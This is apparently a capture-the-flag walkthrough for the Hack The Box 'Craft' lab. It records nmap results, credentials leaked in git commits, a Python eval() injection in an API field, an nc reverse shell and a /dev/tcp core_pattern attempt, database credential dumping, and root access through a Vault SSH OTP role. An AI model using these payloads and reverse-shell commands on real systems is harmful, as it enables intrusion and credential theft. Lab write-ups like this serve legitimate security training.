# Crafty
- Creds
    - `dinesh:4aUh0A8PbVJxgd`
    - `craft:hz66OCkDtv8G6D` - db
    - `ebachman:llJ77D8QFkLPQB`
    - `gilfoyle:ZEU3N8WNM2rh4T`

## NMAP
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 bde76c22817adb3ec0f0731df3af7765 (RSA)
|   256 82b5f9d1953b6d800f3591862db3d766 (ECDSA)
|_  256 283b2618ecdfb336859c27548d8ce133 (ED25519)
443/tcp  open  ssl/http nginx 1.15.8
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_http-server-header: nginx/1.15.8
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
| tls-alpn:
|_  http/1.1
6022/tcp open  ssh      (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-Go
| ssh-hostkey:
|_  2048 5bccbff1a18f72b0c0fbdfa301dca6fb (RSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6022-TCP:V=7.93%I=7%D=1/6%Time=695D8666%P=x86_64-pc-linux-gnu%r(NUL
SF:L,C,"SSH-2\.0-Go\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Foothold
- going through the website
- `api.craft.htb` has a set of apis.
- `gogs.craft.htb` - is a local git solution
    - reading through the issues and commits
    - in dinesh public activity, we can see his commits
    - comparing commits he made for the `BOGUS AVP` issue, we can see his username password used to authenticate for the api.
        - `dinesh:4aUh0A8PbVJxgd`
    - trying that with the gogs implementation, we get logged in.
- there is a gogs rce in msfconsole that requires a username, password
    - **DID NOT WORK**
- going back to the APIs.
    - set up burp with browser to proxy apis
    - get a token using dinesh's login creds
- the bogus AVP issue is open and uses an eval() function that we can exploit
- call the POST /brew API
```
{
  "id": 0,
  "brewer": "string",
  "name": "string",
  "style": "string",
  "abv": "__import__('os').system('nc 10.10.14.246 9001 -e /bin/sh') or 0"
}
```
- will get a listener back on nc
- we are inside a container
- reading settings.py
```
settings.py
cat settings.py
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False
```
- running linpeas
    - check mounts
    - uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon[0m),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
    - /proc mounted
    - Exploiting this
    ```
    echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.67/1337 0>&1'" > /tmp/exploit.sh`
    echo "|/tmp/exploit.sh" > /proc/sys/kernel/core_pattern
    ```
- nothing above worked
- editing the dbtest.py to check the database
- updated the `dbtest.py` script locally to read args and then sent to the target
```
try:
    with connection.cursor() as cursor:
        # sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
        sql = sys.argv[1]
        cursor.execute(sql)
        result = cursor.fetchall()
        print(result)
```
- `python3 dbtest-ap.py "SHOW DATABASES;"` -> craft
- `python3 dbtest-ap.py "SHOW TABLES;"` -> brew, user
- `python3 dbtest-ap.py "SELECT * FROM user;"`
```
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'},
{'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'},
{'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
```
- trying above with ssh did not work
- signed in to gog using gilfoyle to find `craft-infra` private repo
- found .ssh and id_rsa
- `ssh -i id_rsa gilfoyle@craft.htb`
    - enter passphrase as gilfoyle's password
- get user.txt - d58fbb9487a37e7f6a405723baeb6e53

## PrivEsc
- running linpeas
```
/var/backups/shadow.bak

/usr/local/etc/vault-ssh-helper.hcl
vault_addr = "https://172.20.0.2:8200"
ssh_mount_point = "ssh"
tls_skip_verify = true
allowed_roles = "*"

Path          Type         Accessor              Description
----          ----         --------              -----------
cubbyhole/    cubbyhole    cubbyhole_ffc9a6e5    per-token private secret storage
identity/     identity     identity_56533c34     identity store
secret/       kv           kv_2d9b0109           key/value secret storage
ssh/          ssh          ssh_3bbd5276          n/a
sys/          system       system_477ec595       system endpoints used for control, policy and debugging
/home/gilfoyle/.vault-token

ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it 

172.20.0.2 vault.craft.htb
```
- found .vault-token
- checking `craft-infra` repo under gilfoyle gogs
- secrets.sh
```
vault secrets enable ssh

vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0
```
- this will allow ssh into root using otp created by vault
- `vault write ssh/creds/root_otp ip=10.129.229.45`
- `ssh root@craft.htb` - use `key` from above output
- get root.txt - 341fb54a28d3c283ed08c9be1645f69a
